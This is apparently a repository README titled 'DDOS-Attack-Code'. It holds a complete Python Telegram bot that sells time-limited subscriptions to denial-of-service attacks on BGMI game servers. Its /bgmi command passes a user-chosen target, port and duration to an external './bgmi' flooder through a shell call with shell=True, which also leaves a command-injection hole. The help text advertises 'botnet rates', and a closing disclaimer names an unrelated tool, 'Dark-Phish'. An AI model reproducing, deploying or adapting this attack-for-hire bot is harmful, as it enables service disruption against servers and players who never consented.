# DDOS-Attack-Code
```bash
import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('Enter Bot Token Here')

# Admin user IDs
admin_id = ["1234*****","12345*******"]

# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Define subscription periods in seconds
subscription_periods = {
    '1min': 60,
    '1hour': 3600,
    '6hours': 21600,
    '12hours': 43200,
    '1day': 86400,
    '3days': 259200,
    '7days': 604800,
    '1month': 2592000,
    '2months': 5184000
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read subscriptions from the file
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    user_id = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        subscriptions[user_id] = expiry
                    except ValueError:
                        print(f"Error parsing date for user {user_id}: {expiry_str}")
                else:
                    print(f"Invalid line in subscription file: {line}")
    except FileNotFoundError:
        pass
    return subscriptions

# Function to write subscriptions to the file
def write_subscriptions(subscriptions):
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, expiry in subscriptions.items():
            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

# List to store allowed user IDs
allowed_user_ids = read_users()
subscriptions = read_subscriptions()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to check if a user is subscribed
def is_subscribed(user_id):
    if user_id in subscriptions:
        if datetime.datetime.now() < subscriptions[user_id]:
            return True
        else:
            del subscriptions[user_id]
            write_subscriptions(subscriptions)
    return False

# Function to add or update a user's subscription
def add_subscription(user_id, duration):
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    subscriptions[user_id] = expiry
    write_subscriptions(subscriptions)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            period = command[2]
            if period in subscription_periods:
                duration = subscription_periods[period]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                add_subscription(user_to_add, duration)
                response = f"User {user_to_add} added with {period} subscription successfully 🎉"
            else:
                response = "Invalid subscription period. Use: 1min, 1hour, 6hours, 12hours, 1day, 3days, 7days, 1month, or 2months."
        else:
            response = "Please specify a User ID and subscription period to add."
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                if user_to_remove in subscriptions:
                    del subscriptions[user_to_remove]
                    write_subscriptions(subscriptions)
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a User ID to remove."
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            expiry = subscriptions.get(user_id, "No subscription")
                            response += f"- @{username} (ID: {user_id}) | Expires: {expiry}\n"
                        except Exception as e:
                            response += f"- User ID: {user_id} | Expires: {subscriptions.get(user_id, 'No subscription')}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "Only admin can run this command."
        bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"Dear {username}, Attack Activated\n\n"
        f"🎯 Target: `{target}`\n"
        f"🔌 Port: `{port}`\n"
        f"⏳ Duration: `{time} seconds`\n"
        f"🎮 App: `BGMI`\n\n"
        f"🚀 Don't Close Attack is Processing...🚀\n"
        f"🌐 Monitoring The Target Performance."
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/AVIHACKERYT")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)


# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished: {target} Port: {port} Time: {time}"
        else:
            response = "Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "You Are Not Authorised To Use This Command."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands


@bot.message_handler(commands=['plan'])
def show_plan(message):
   # response = "Our plans:\n"
    #response += "- Basic Plan: $10/month\n"
   # response += "- Pro Plan: $20/month\n"
    #response += "- Premium Plan: $30/month\n"
    response = "- Know our services from @AVIHACKERYT\n"

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def show_rules(message):
    response = "Rules:\n"
    response += "- Attacks are limited to authorized targets only.\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids and is_subscribed(user_id):
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You are not authorized to use this command or your subscription has expired."
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "Admin commands:\n"
        response += "/allusers - List all authorized users\n"
        response += "/clearlogs - Clear all command logs\n"
        response += "/remove <user_id> - Remove a user\n"
        bot.reply_to(message, response)
    else:
        response = "Only admin can run this command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your Telegram ID: `{user_id}`"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def show_help(message):
    response = """Welcome to our bot! Here are the available commands and features:

🎮 **Game Server Attack:**
/bgmi - Launch an attack on BGMI servers.

📜 **Information and Logs:**
/rules - Read the rules before using the bot.
/mylogs - View your recent attack logs.
/plan - Check our botnet rates and plans.

🔧 **Admin Commands:**
/admincmd - View all admin commands (Admin only).
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/AVIHACKERYT'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/AVIHACKERYT')
    )

    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'👋🏻 Welcome, {user_name}!\n\n'
    response += 'This bot allows you to perform attacks.\n\n'
    response += 'Commands:\n'
    response += '/id : Get your id to buy subscription\n'
    response += '/help : Know other commands\n'
    response += '/bgmi : Launch an attack\n'
    response += '/mylogs : View recent attacks\n'
    response += '/plan : View attacks plans\n'
    response += '/admincmd : View admin commands\n\n'
    response += 'For help and updates click below buttons\n'
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('UPDATES', url='https://t.me/AVIHACKERYT'),
        telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/AVIHACKERYT')  
    )

    bot.reply_to(message, response, reply_markup=keyboard)



# Start the bot
bot.polling()
```


#NOTE

***Any use of this tool for illegal or unethical activities is strictly prohibited. The authors and contributors are not responsible for any misuse or damage caused by Dark-Phish. Use it responsibly and ensure compliance with all applicable laws and regulations in your jurisdiction
